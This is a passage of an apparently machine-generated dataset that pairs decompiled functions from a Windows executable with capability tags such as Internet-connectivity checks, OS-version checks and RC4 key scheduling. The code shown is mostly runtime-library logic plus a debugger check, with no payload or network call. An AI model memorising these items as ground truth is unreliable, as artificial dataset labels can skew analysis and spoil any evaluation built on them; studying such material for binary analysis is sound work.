        "decompiled_code": "\ncode ** __thiscall fcn.004194a0(code **param_1, int32_t param_2)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e3b0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    var_20h = param_1;\n    fcn.00405a60(param_1 + 1);\n    ppcVar1 = var_20h;\n    if (var_8h != 0) {\n        fcn.00401e7e(var_20h);\n    }\n    *in_FS_OFFSET = var_18h;\n    return ppcVar1;\n}\n",
        "token_count": 254
    },
    "0040197e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040197e(uint noname_0, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x28) == '\\0') {\n        uVar1 = *(arg_ch + 0x10);\n    }\n    else {\n        uVar1 = *(arg_ch + 0xc);\n    }\n    uVar1 = fcn.00401c8f(uVar1);\n    *(in_ECX + 0x10) = uVar1;\n    uVar1 = 0x54c277;\n    if (*(arg_ch + 0x2e) < 5) {\n        uVar1 = *(arg_ch + 0x20);\n    }\n    uVar1 = fcn.00401c8f(uVar1);\n    *(in_ECX + 0x14) = uVar1;\n    uVar1 = 0x54e5a4;\n    if (*(arg_ch + 0x2f) < 5) {\n        uVar1 = *(arg_ch + 0x24);\n    }\n    uVar1 = fcn.00401c8f(uVar1);\n    *(in_ECX + 0x18) = uVar1;\n    *(in_ECX + 0xc) = **(arg_ch + 0x14);\n    *(in_ECX + 0xd) = **(arg_ch + 0x18);\n    return;\n}\n",
        "token_count": 327
    },
    "00401a3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401a3c(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar2 != 0) {\n        if (arg_8h != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(arg_8h);\n        }\n        iVar3 = fcn.00401ae6();\n        if (iVar3 != 1) {\n            return 4;\n        }\n    }\n    iVar3 = fcn.00404b7e();\n    if ((iVar3 == 2) && (cVar1 = fcn.00402e19(),  cVar1 != '\\0')) {\n        cVar1 = fcn.00404d3b();\n        if (cVar1 == '\\0') {\n            arg_10h = arg_10h | 0x200000;\n            arg_8h_00 = 0;\n        }\n        else {\n            arg_8h_00 = fcn.00401aa5();\n        }\n        iVar2 = fcn.00404d22(arg_8h_00, arg_8h, arg_ch, arg_10h);\n        return iVar2;\n    }\n    return (iVar2 != 0) + 3;\n}\n",
        "token_count": 328
    },
    "00401a6e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_13h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid __cdecl fcn.00401a6e(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_13h;\n    uint var_4h;\n    \n    fcn.0040536c(0x6c);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x74) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -100) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.0040632a(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x573000)(unaff_EBP + -0x5c);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x4c) == 0) {\n        *(unaff_EBP + -0x5e) = 0;\n    }\n    else {\n        uVar3 = fcn.004058b2();\n        *(unaff_EBP + -0x5e) = uVar3;\n    }\n    piVar5 = fcn.004035a8(*(unaff_EBP + -100));\n    pcVar2 = *(*piVar5 + 0x1c);\n    (**0x573000)(0x54da14, 0x54da2f, unaff_EBP + -0x2c);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x74);\n    *(unaff_EBP + -0x68) = puVar10;\n    cVar4 = fcn.00403f7b(*(unaff_EBP + -0x6c));\n    if (cVar4 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar4 = *(iVar8 + 5);\n        if (cVar4 == *(unaff_EBP + -0x15)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar4 = *(iVar8 + 5);\n            }\n            if (cVar4 != *(unaff_EBP + -0x16)) goto code_r0x004653b0;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x68) = puVar10 + 1;\n        fcn.00401c5d();\n    }\ncode_r0x004653b0:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -100) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x5f) = 0;\n    cVar4 = fcn.00403f7b(*(unaff_EBP + -0x6c));\n    if (cVar4 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        if (*(iVar8 + 5) != *(unaff_EBP + -0x2c)) goto code_r0x00465474;\n        *(unaff_EBP + -0x5d) = 1;\n        *(unaff_EBP + -0x70) = 1;\n        fcn.00401c5d();\n        cVar4 = fcn.00403f7b(*(unaff_EBP + -0x6c));\n        if (cVar4 != '\\0') {\ncode_r0x0046546b:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x00465484;\n            }\n            goto code_r0x00465480;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar4 = *(iVar8 + 5);\n        if (cVar4 != *(unaff_EBP + -0x13)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar4 = *(iVar8 + 5);\n            }\n            if (cVar4 != *(unaff_EBP + -0x14)) goto code_r0x0046546b;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x00465480;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x5d) = 0;\n        *(unaff_EBP + -0x70) = 0;\n        fcn.00401c5d();\ncode_r0x00465484:\n        *(unaff_EBP + -100) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x00465474:\n        *(unaff_EBP + -0x5d) = 0;\n        *(unaff_EBP + -0x70) = 0;\n        if (uVar11 != 0) {\ncode_r0x00465480:\n            if (uVar11 != 10) goto code_r0x00465484;\n        }\n    }\n    fcn.004036e8(1, *(unaff_EBP + -0x70));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x74) + 0x1f;\n    uVar12 = fcn.00403f7b(*(unaff_EBP + -0x6c));\n    if (uVar12 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                uVar12 = fcn.004019e7();\n            }\n            uVar12 = uVar12 & 0xffffff00 | *(iVar8 + 5);\n            *(unaff_EBP + -0x78) = uVar12;\n            uVar12 = fcn.00402801(unaff_EBP + -0x2c, uVar12);\n            if (uVar12 < *(unaff_EBP + -100)) {\n                cVar1 = *(unaff_EBP + -0x5f);\n                cVar4 = *(uVar12 + 0x54da14);\n                pcVar9 = *(unaff_EBP + -0x68);\n                *pcVar9 = cVar4;\n                if (((cVar1 != '\\0') || (cVar4 != '0')) && (pcVar9 < *(unaff_EBP + -0x70))) {\n                    *(unaff_EBP + -0x5f) = 1;\n                    *(unaff_EBP + -0x68) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x44;\n                *(unaff_EBP + -0x5d) = 1;\n                if (0xf < *(unaff_EBP + -0x30)) {\n                    iVar6 = *(unaff_EBP + -0x44);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x44;\n                    if (0xf < *(unaff_EBP + -0x30)) {\n                        iVar6 = *(unaff_EBP + -0x44);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar12 = *(unaff_EBP + -0x30);\n                iVar6 = *(unaff_EBP + -0x44);\n                iVar7 = unaff_EBP + -0x44;\n                if (0xf < uVar12) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x5e) == '\\0')) goto code_r0x0046559e;\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar4 = *(iVar8 + 5);\n                    uVar12 = *(unaff_EBP + -0x30);\n                    iVar6 = *(unaff_EBP + -0x44);\n                }\n                else {\n                    cVar4 = *(unaff_EBP + -0x78);\n                }\n                if (cVar4 != *(unaff_EBP + -0x5e)) goto code_r0x0046559e;\n                fcn.00404476(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.00401c5d();\n            uVar12 = fcn.00403f7b(*(unaff_EBP + -0x6c));\n        } while (uVar12 == '\\0');\n        uVar12 = *(unaff_EBP + -0x30);\n        iVar6 = *(unaff_EBP + -0x44);\ncode_r0x0046559e:\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x44;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar4 = '\\0';\n                goto code_r0x004655c2;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        uVar12 = *(unaff_EBP + -0x30);\n        iVar6 = *(unaff_EBP + -0x44);\n    }\n    cVar4 = *(unaff_EBP + -0x5d);\ncode_r0x004655c2:\n    pcVar9 = unaff_EBP + -0x5c;\n    if (0xf < *(unaff_EBP + -0x48)) {\n        pcVar9 = *(unaff_EBP + -0x5c);\n    }\n    if (cVar4 == '\\0') {\ncode_r0x00465636:\n        puVar10 = *(unaff_EBP + -0x74);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar4 = *pcVar9,  cVar4 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -100) = unaff_EBP + -0x44;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -100) = *(unaff_EBP + -0x44);\n                }\n                iVar6 = *(unaff_EBP + -0x44);\n                if (cVar4 != *(*(unaff_EBP + -100) + iVar13)) goto code_r0x00465636;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -100) = unaff_EBP + -0x44;\n                if (0xf < *(unaff_EBP + -0x30)) {\n                    *(unaff_EBP + -100) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x30);\n                if (cVar4 < **(unaff_EBP + -100)) goto code_r0x00465636;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x68);\n        if (*(unaff_EBP + -0x5f) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.004029b9();\n    fcn.004029b9();\n    fcn.004067d0();\n    return;\n}\n",
        "token_count": 3091
    },
    "00401a78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401a78(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint arg_8h_00;\n    \n    if ((*(in_ECX + 1) < '\\x02') && (arg_8h != 0)) {\n        arg_8h_00 = 0;\n        if (*in_ECX == 0) {\n            fcn.00402379(arg_8h);\n        }\n        else {\n            cVar1 = *(arg_8h + 4);\n            if ((cVar1 == '\\0') || (cVar1 == '\\x01')) {\n                iVar2 = fcn.004051dc(8);\n                if (iVar2 != 0) {\n                    arg_8h_00 = fcn.004038ff(arg_8h);\n                }\n                fcn.004062ad(arg_8h_00);\n            }\n            else {\n                fcn.0040648d(cVar1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00401a9b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401a9b(int32_t *arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (*(in_ECX + 1) == '\\0') {\n        fcn.00405c40();\n    }\n    if (*(arg_8h + 1) == '\\0') {\n        fcn.00405c40();\n    }\n    if (*in_ECX == 0) {\n        if (*arg_8h != 0) {\n            return 0;\n        }\n    }\n    else if (*arg_8h == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 143
    },
    "00401ab9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401ab9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    int16_t *var_4h;\n    \n    if (*(param_1 + 0x45c) == 1) {\n        *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n        *(param_1 + 0x28) = *(*(param_1 + 0x14) + -4);\n    }\n    else {\n        var_4h = NULL;\n        iVar1 = fcn.00403607(*(param_1 + 0x10), &var_4h, 10);\n        iVar1 = iVar1 + -1;\n        *(param_1 + 0x10) = var_4h + 1;\n        if (*(param_1 + 0x458) == 1) {\n            if (((-1 < iVar1) && (*var_4h == 0x24)) && (iVar1 < 100)) {\n                iVar2 = *(param_1 + 0xaa4);\n                if (*(param_1 + 0xaa4) < iVar1) {\n                    iVar2 = iVar1;\n                }\n                *(param_1 + 0xaa4) = iVar2;\n                uVar3 = fcn.00403819(param_1 + 0x464 + iVar1 * 0x10, 1, *(param_1 + 0x32), *(param_1 + 0x2c));\n                return uVar3;\n            }\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        *(param_1 + 0x28) = **(param_1 + 0x46c + iVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 441
    },
    "00401ac8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ac8(uchar *arg_8h, int32_t arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    code **ppcVar3;\n    uint *in_ECX;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (arg_ch < 1)) {\n        *(in_ECX + 1) = 2;\n        return;\n    }\n    if (arg_ch == 1) {\n        ppcVar3 = fcn.004051dc(8);\n        if (ppcVar3 != NULL) {\n            uVar1 = *arg_8h;\n            *ppcVar3 = vtable.charNode.0;\n            *(ppcVar3 + 1) = uVar1;\n            goto code_r0x004896bc;\n        }\n    }\n    else {\n        iVar2 = fcn.004051dc(0xc);\n        if (iVar2 != 0) {\n            ppcVar3 = fcn.004056d7(arg_8h, arg_ch);\n            goto code_r0x004896bc;\n        }\n    }\n    ppcVar3 = NULL;\ncode_r0x004896bc:\n    *in_ECX = ppcVar3;\n    if (ppcVar3 == NULL) {\n        *(in_ECX + 1) = 3;\n    }\n    return;\n}\n",
        "token_count": 308
    },
    "00401acd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00401acd(uint arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, int32_t *arg_18h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t in_stack_ffffff5c;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_88h = arg_10h;\n    *arg_18h = 0;\n    if (arg_ch == 1) {\n        iVar2 = fcn.004d2a1d(arg_8h, arg_10h, arg_14h, &fcn.00401acd::var_84h, 0x80);\n        if (iVar2 != 0) {\n            in_stack_ffffff5c = 1;\n            iVar3 = fcn.00404fd9(iVar2, 1);\n            *arg_18h = iVar3;\n            fcn.00406302(0);\n            if (*arg_18h != 0) {\n                in_stack_ffffff5c = iVar2 + -1;\n                iVar2 = fcn.004029af(*arg_18h, iVar2, &fcn.00401acd::var_84h, in_stack_ffffff5c);\n                if (iVar2 != 0) {\n                    fcn.004035f8(0, 0, 0, 0, 0);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n            }\n            goto code_r0x004d2cc9;\n        }\n        in_stack_ffffff5c = 0x4d2bdf;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar2 != 0x7a) || (iVar2 = fcn.004d2a1d(arg_8h, arg_10h, arg_14h, 0, 0),  iVar2 == 0))\n        goto code_r0x004d2cc9;\n        iVar3 = fcn.00404fd9(iVar2, 1);\n        if (iVar3 != 0) {\n            iVar2 = fcn.004d2a1d(arg_8h, var_88h, arg_14h, iVar3, iVar2);\ncode_r0x004d2c38:\n            if (iVar2 != 0) {\n                *arg_18h = iVar3;\n                iVar3 = 0;\n            }\n        }\n    }\n    else {\n        if (arg_ch != 2) {\n            if (arg_ch == 0) {\n                in_stack_ffffff5c = 2;\n                var_88h = 0;\n                iVar2 = fcn.00404746(arg_10h, arg_14h | 0x20000000, &fcn.00401acd::var_88h, 2);\n                if (iVar2 != 0) {\n                    *arg_18h = var_88h;\n                }\n            }\n            goto code_r0x004d2cc9;\n        }\n        in_stack_ffffff5c = 0;\n        iVar2 = fcn.00404746(arg_10h, arg_14h, 0, 0);\n        if (iVar2 == 0) goto code_r0x004d2cc9;\n        iVar3 = fcn.00404fd9(iVar2, 2);\n        if (iVar3 != 0) {\n            iVar2 = fcn.00404746(var_88h, arg_14h, iVar3, iVar2);\n            goto code_r0x004d2c38;\n        }\n    }\n    fcn.00406302(iVar3);\ncode_r0x004d2cc9:\n    fcn.00403085(in_stack_ffffff5c);\n    return;\n}\n",
        "token_count": 908
    },
    "00401ae6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00401ae6(void)\n\n{\n    int32_t in_FS_OFFSET;\n    int32_t iStackY20;\n    int32_t var_4h;\n    \n    if (*0x570494 == 0) {\n        var_4h = 2;\n        if (-1 < *(*(*(in_FS_OFFSET + 0x30) + 0x10) + 8)) {\n            fcn.004059ac(&var_4h);\n        }\n        *0x570494 = 2;\n        if (var_4h != 1) {\n            if (var_4h == 2) {\n                *0x570494 = 1;\n            }\n            else if (var_4h == 3) {\n                iStackY20 = 3;\n                *0x570494 = iStackY20;\n            }\n            else {\n                iStackY20 = 4;\n                *0x570494 = iStackY20;\n            }\n        }\n    }\n    return *0x570494;\n}\n",
        "token_count": 225
    },
    "00401b4a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl fcn.00401b4a(char *arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    uint var_14h;\n    uint var_ch;\n    uchar *lpOutputString;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if (arg_8h != NULL) {\n        pcVar3 = arg_8h;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        iVar2 = (pcVar3 - (arg_8h + 1)) + 1;\n        if (iVar2 != 0) {\n            fcn.0040349f();\n            lpOutputString = &var_14h;\n            iVar2 = fcn.004023fb(&var_ch, &var_14h, iVar2, arg_8h, pcVar3 - (arg_8h + 1));\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(lpOutputString);\n            }\n        }\n    }\n    fcn.00403085(var_ch);\n    return;\n}\n",
        "token_count": 316
    },
    "00401b7c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00401b7c(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_18h;\n    uint32_t uVar3;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uchar var_4h;\n    uchar var_3h;\n    uint var_2h;\n    \n    if (arg_8h == 0xffffffff) {\n        return 0xffffffff;\n    }\n    fcn.004057e5(arg_ch);\n    if (arg_8h < 0x100) {\n        uVar3 = *(*(var_18h + 0x94) + (arg_8h & 0xff));\n        if (var_10h == '\\0') {\n            return uVar3;\n        }\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n        return uVar3;\n    }\n    var_2h._0_1_ = 0;\n    if (1 < *(var_18h + 4)) {\n        var_ch = arg_8h >> 8;\n        iVar1 = fcn.00405961(var_ch & 0xff, &var_18h);\n        if (iVar1 != 0) {\n            var_2h._0_1_ = 0;\n            arg_18h = 2;\n            var_4h = var_ch;\n            var_3h = arg_8h;\n            goto code_r0x004bd3b0;\n        }\n    }\n    puVar2 = fcn.004039a4();\n    *puVar2 = 0x2a;\n    arg_18h = 1;\n    var_3h = 0;\n    var_4h = arg_8h;\ncode_r0x004bd3b0:\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    iVar1 = fcn.00405d80(&var_18h, *(var_18h + 0xa8), 0x100, &var_4h, arg_18h, &var_8h, 3, *(var_18h + 8), 1);\n    if (iVar1 != 0) {\n        arg_8h = var_8h;\n        if (iVar1 != 1) {\n            arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n        }\n    }\n    if (var_10h != '\\0') {\n        *(var_1ch + 0x350) = *(var_1ch + 0x350) & 0xfffffffd;\n    }\n    return arg_8h;\n}\n",
        "token_count": 674
    },
    "00401bb8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar (*) [16] __cdecl fcn.00401bb8(uchar (*arg_8h) [16], uint arg_ch)\n\n{\n    char *pcVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    uchar (*pauVar4) [16];\n    uint32_t uVar5;\n    int32_t iVar6;\n    uchar (*pauVar7) [16];\n    char *pcVar8;\n    uint8_t *puVar9;\n    uchar auVar11 [16];\n    uchar auVar13 [16];\n    char cVar16;\n    char cVar17;\n    char cVar18;\n    char cVar19;\n    char cVar20;\n    char cVar21;\n    char cVar22;\n    uchar auVar15 [16];\n    uint8_t *puVar10;\n    uint8_t uVar12;\n    uint8_t uVar14;\n    \n    if (*0x56ec4c != 0) {\n        if (*0x56ec4c < 2) {\n            auVar15 = pshuflw(ZEXT216(CONCAT11(arg_ch, arg_ch)), ZEXT216(CONCAT11(arg_ch, arg_ch)), 0);\n            uVar3 = -1 << (arg_8h & 0xf);\n            pcVar8 = arg_8h - (arg_8h & 0xf);\n            pauVar7 = NULL;\n            while( true ) {\n                uVar14 = -(pcVar8[0xf] == '\\0');\n                auVar13 = CONCAT115(uVar14, CONCAT114(-(pcVar8[0xe] == '\\0'), \n                                                      CONCAT113(-(pcVar8[0xd] == '\\0'), \n                                                                CONCAT112(-(pcVar8[0xc] == '\\0'), \n                                                                          CONCAT111(-(pcVar8[0xb] == '\\0'), \n                                                                                    CONCAT110(-(pcVar8[10] == '\\0'), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        '\\0'), CONCAT18(\n                                                            -(pcVar8[8] == '\\0'), \n                                                            CONCAT17(-(pcVar8[7] == '\\0'), \n                                                                     CONCAT16(-(pcVar8[6] == '\\0'), \n                                                                              CONCAT15(-(pcVar8[5] == '\\0'), \n                                                                                       CONCAT14(-(pcVar8[4] == '\\0'), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          '\\0'), \n                                                            CONCAT12(-(pcVar8[2] == '\\0'), \n                                                                     CONCAT11(-(pcVar8[1] == '\\0'), -(*pcVar8 == '\\0')))\n                                                            )))))))))))));\n                cVar16 = SUB161(auVar15 >> 8, 0);\n                cVar17 = SUB161(auVar15 >> 0x10, 0);\n                cVar18 = SUB161(auVar15 >> 0x18, 0);\n                cVar19 = SUB161(auVar15 >> 0x20, 0);\n                cVar20 = SUB161(auVar15 >> 0x28, 0);\n                cVar21 = SUB161(auVar15 >> 0x30, 0);\n                cVar22 = SUB161(auVar15 >> 0x38, 0);\n                uVar12 = -(pcVar8[0xf] == cVar22);\n                auVar11 = CONCAT115(uVar12, CONCAT114(-(pcVar8[0xe] == cVar21), \n                                                      CONCAT113(-(pcVar8[0xd] == cVar20), \n                                                                CONCAT112(-(pcVar8[0xc] == cVar19), \n                                                                          CONCAT111(-(pcVar8[0xb] == cVar18), \n                                                                                    CONCAT110(-(pcVar8[10] == cVar17), \n                                                                                              CONCAT19(-(pcVar8[9] ==\n                                                                                                        cVar16), \n                                                                                                       CONCAT18(-(pcVar8\n                                                            [8] == SUB161(auVar15, 0)), \n                                                            CONCAT17(-(pcVar8[7] == cVar22), \n                                                                     CONCAT16(-(pcVar8[6] == cVar21), \n                                                                              CONCAT15(-(pcVar8[5] == cVar20), \n                                                                                       CONCAT14(-(pcVar8[4] == cVar19), \n                                                                                                CONCAT13(-(pcVar8[3] ==\n                                                                                                          cVar18), \n                                                                                                         CONCAT12(-(\n                                                            pcVar8[2] == cVar17), \n                                                            CONCAT11(-(pcVar8[1] == cVar16), \n                                                                     -(*pcVar8 == SUB161(auVar15, 0)))))))))))))))));\n                uVar5 = (SUB161(auVar13 >> 7, 0) & 1 | (SUB161(auVar13 >> 0xf, 0) & 1) << 1 |\n                         (SUB161(auVar13 >> 0x17, 0) & 1) << 2 | (SUB161(auVar13 >> 0x1f, 0) & 1) << 3 |\n                         (SUB161(auVar13 >> 0x27, 0) & 1) << 4 | (SUB161(auVar13 >> 0x2f, 0) & 1) << 5 |\n                         (SUB161(auVar13 >> 0x37, 0) & 1) << 6 | (SUB161(auVar13 >> 0x3f, 0) & 1) << 7 |\n                         (SUB161(auVar13 >> 